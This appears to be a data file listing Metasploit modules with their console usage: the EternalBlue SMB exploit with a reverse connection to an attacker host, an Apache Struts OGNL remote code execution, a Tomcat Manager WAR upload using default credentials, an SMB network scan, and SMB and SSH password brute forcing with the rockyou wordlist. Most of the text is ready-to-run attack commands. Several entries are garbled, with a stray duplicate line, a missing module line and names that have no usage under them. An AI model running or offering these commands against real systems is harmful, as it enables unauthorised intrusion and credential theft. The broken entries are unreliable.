modules.name: EternalBlue
modules.usage:
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target
set LHOST attacker
exploit

modules.name: Apache Struts RCE
modules.desc: Apache Struts 2 Jakarta Multipart Parser OGNL Injection
modules.usage:
use exploit/multi/http/struts2_content_type_ognl
set RHOSTS target
set TARGETURI /struts2-showcase/
exploit

modules.name: Tomcat Manager Upload
modules.desc: Apache Tomcat Manager Application WAR Upload
modules.usage:
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS target
set HttpUsername tomcat
set HttpPassword s3cret
exploit

exploit

modules.name: WordPress Admin Shell Upload

modules.name: SMB Version Scanner
modules.usage:
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

modules.name: SMB Login
modules.usage:
use auxiliary/scanner/smb/smb_login
set RHOSTS target
set SMBUser admin
set PASS_FILE /usr/share/wordlists/rockyou.txt
run

modules.name: SSH Login
modules.usage:

set RHOSTS target

set PASS_FILE wordlist.txt
run

modules.name: DNS Enum

modules.name: TCP Port Scanner

modules.name: Windows Meterpreter Reverse TCP
